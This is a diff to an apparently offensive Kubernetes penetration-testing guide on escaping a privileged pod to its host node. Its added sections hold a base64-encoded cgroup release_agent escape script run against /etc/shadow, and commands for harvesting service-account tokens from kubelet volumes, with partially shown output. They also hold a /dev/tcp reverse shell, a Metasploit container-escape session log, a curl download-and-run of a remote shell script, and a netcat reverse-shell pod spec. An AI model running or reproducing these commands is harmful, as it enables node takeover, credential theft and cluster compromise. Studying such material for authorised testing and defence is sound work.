@@ -1,8 +1,8 @@
 ## You can create a pod with only privileged: true
 
-If you only have `privileged=true`, you can eventually get an interactive shell on the node, but you start with non-interactive command execution as root and you'll have to upgrade it if you want interactive access. 
+If you only have `privileged=true`, you can use Felix Wilhelm's exploit to get non-interactive command execution as root on the underlying node running your pod. If you want an interactive shell, you'll have to either use Felix's exploit to download your shell and then again to execute it, or you can use the metasploit module “docker privileged container escape” which uses the same exploit to upgrade a shell recieved from a container to a shell on the host. 
 
-One promising privesc path is available if you can schedule your pod to run on the control plane node using the nodeName selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
+In either case, the kubernetes privesc paths as the same as with the other pods where you get root access on the node. One promising privesc path is available if you can schedule your pod to run on the control plane node using the `nodeName` selector (not possible in most cloud hosted k8s environments). Even if you can only schedule your pod on the worker node, you can access the node's kubelet credentials or you can create mirror/static pods in any namespace. You can also access any secret mounted within any pod on the node you are on. **In a production cluster, even on a worker node, there is usually at least one pod that has a `token` mounted that is bound to a `service account` that is bound to a `clusterrolebinding`, that gives you access to do things like create pods or view secrets in all namespaces**.  
 
 # Pod Creation
 
@@ -57,7 +57,8 @@ spec:
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
     securityContext:
       privileged: true
-    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  restartPolicy: Always
+    #nodeName: k8s-control-plane-node # Force your pod to run on a control-plane node by uncommenting this line and changing to a control-plane node name  
+    restartPolicy: Always
 ```
 [pod-priv-revshell.yaml](pod-priv-revshell.yaml)
 
@@ -82,20 +83,131 @@ Connection received on 10.0.0.162 42035
 
 # Post exploitation
 
+So this could be a limitation of my linux-fu, but I have not been able to use Felix's exploit to directly spawn a remote connection of any kind. However, there are three good options when it comes to post exploitation: 
+
+* Use Felix Wilhelm's undock.sh and hunt around with non-interactive access
+* Use the metasploit module: docker_privileged_container_escape
+* Use undock.sh to download your own reverse shell script and then execute it spawn the reverse shell
+
+
+### Option 1: Use Felix Wilhelm's undock.sh and hunt around with non-interactive access
+
 #### Create undock script that will automate the container escape POC
 ```bash
 echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
 ```
-
 #### Then use the script to run whatever commands you want on the host: 
 ```bash
 sh undock.sh "cat /etc/shadow"
 ```
 
-Reference(s): 
-* https://twitter.com/_fel1x/status/1151487051986087936
-* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
+#### Find all tokens from all pods 
+```bash
+ sh undock.sh "find /var/lib/kubelet/pods/ -name token -type l"
+/var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
+/var/lib/kubelet/pods/2b181912-2444-43b4-83f4-faa13fe0f87b/volumes/kubernetes.io~secret/calico-node-token-d426t/token
+/var/lib/kubelet/pods/a824d7dc-c86b-41ea-a111-b190985d5f4d/volumes/kubernetes.io~secret/default-token-qqgjc/token
+/var/lib/kubelet/pods/001bdb14-a0c0-4fd0-ac4b-4b414cb8b075/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
+/var/lib/kubelet/pods/d04d2626-5f01-456c-815e-d7a3ad4a38a2/volumes/kubernetes.io~secret/default-token-qqgjc/token
+/var/lib/kubelet/pods/e8004bbe-56ae-4612-b1ec-61bb0a6fbc6f/volumes/kubernetes.io~secret/default-token-qqgjc/token
+```
 
+#### Cat out one of the tokens
+```bash
+sh undock.sh "cat /var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token"
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[redacted]
+```
+
+#### For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
+```bash
+DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
+kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
+kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
+```
+
+Does the token allow you to view secrets in that namespace? How about other namespaces?
+Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
+
+### Option 2: Use the metasploit module: docker_privileged_container_escape
+
+#### Fire up your multi handler, using the -z flag to avoid interacting with the session
+```bash
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.0.0.127
+LHOST => 10.0.0.127
+msf6 exploit(multi/handler) > set port 4444
+port => 4444
+msf6 exploit(multi/handler) > run -jz
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 10.0.0.127:4444
+```
+
+#### From the pod, fire up a reverse shell
+```bash
+root@pod-priv:/# /bin/sh -i >& /dev/tcp/10.0.0.127/4444 0>&1
+```
+
+#### Catch shell from pod and spawn a shell on the host
+```bash
+[*] Started reverse TCP handler on 10.0.0.127:4444
+msf6 exploit(multi/handler) > [*] Command shell session 1 opened (10.0.0.127:4444 -> 10.0.0.162:24316) at 2020-11-20 11:26:52 -0500
+
+msf6 exploit(multi/handler) > use exploit/linux/local/docker_privileged_container_escape
+[*] No payload configured, defaulting to linux/armle/meterpreter/reverse_tcp
+msf6 exploit(linux/local/docker_privileged_container_escape) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(linux/local/docker_privileged_container_escape) > set session 1
+session => 1
+msf6 exploit(linux/local/docker_privileged_container_escape) > run
+
+[!] SESSION may not be compatible with this module.
+[*] Started reverse TCP handler on 10.0.0.127:4444
+[*] Executing automatic check (disable AutoCheck to override)
+[+] The target appears to be vulnerable. Inside Docker container and target appears vulnerable
+[*] Writing payload executable to '/tmp/wsKXoIW'
+[*] Writing '/tmp/wsKXoIW' (286 bytes) ...
+[*] Executing script to exploit privileged container
+[*] Searching for payload on host
+[*] Sending stage (3008420 bytes) to 10.0.0.162
+[*] Meterpreter session 2 opened (10.0.0.127:4444 -> 10.0.0.162:47308) at 2020-11-20 11:28:18 -0500
+[*] Sending stage (3008420 bytes) to 10.0.0.162
+[*] Meterpreter session 3 opened (10.0.0.127:4444 -> 10.0.0.162:47310) at 2020-11-20 11:28:18 -0500
+[*]
+[*] Waiting 20s for payload
+
+meterpreter > shell
+Process 3068510 created.
+Channel 1 created.
+whoami
+root
+hostname
+k8s-worker
+cat var/lib/kubelet/pods/998357c8-45c7-4089-9651-cb8b185f7da8/volumes/kubernetes.io~secret/default-token-qqgjc/token
+eyJhbGciOiJSUzI1NiIsImtpZCI6Ik[REDACTED]
+```
+
+### Option 3: Use undock.sh to download your own payload and then execute it spawn the reverse shell 
+
+```bash
+root@pod-priv:/# sh undock.sh "curl -sL http://10.0.0.127:8000/rshell.sh -o /tmp/rshell.sh"
+root@pod-priv:/# sh undock.sh "bash -c /tmp/rshell.sh"
+```
+
+### Catch the shell, do some damage
+```bash
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.0.0.127] from (UNKNOWN) [10.0.0.162] 48572
+id
+uid=0(root) gid=0(root) groups=0(root)
+hostname
+k8s-worker
+
+```
+
+## What to look for on a node
 
 #### Look for kubeconfig's in the host filesystem 
 If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
@@ -127,16 +239,17 @@ development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-to
 development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
 kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
 kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token
+```
 
-
-# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
+For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
+```bash
 DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
 kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
 kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions
-
-# Does the token allow you to view secrets in that namespace? How about other namespaces?
-# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
 ```
+Does the token allow you to view secrets in that namespace? How about other namespaces?
+Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
+
 
 #### Some other ideas:
 * Add your public key to node and ssh to it
@@ -159,4 +272,4 @@ If you are performing a penetration test, the end goal is not to gain cluster-ad
 # Reference(s): 
 * https://twitter.com/_fel1x/status/1151487051986087936
 * https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
-
+* https://www.rapid7.com/db/modules/exploit/linux/local/docker_privileged_container_escape/
